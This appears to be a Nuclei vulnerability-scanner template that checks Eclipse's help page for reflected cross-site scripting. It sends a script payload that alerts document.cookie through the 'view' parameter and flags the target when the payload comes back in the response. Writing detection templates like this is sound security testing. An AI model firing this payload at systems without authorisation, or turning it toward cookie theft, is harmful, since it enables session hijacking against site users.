id: eclipse-xss

info:
  name: Eclipse Reflected XSS vulnerability
  author: h0tak88r
  severity: medium

http:
  - method: GET
    path:
      - "{{BaseURL}}/help/index.jsp?view=<script>alert(document.cookie)</script>"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<script>alert(document.cookie)</script>"
        part: body
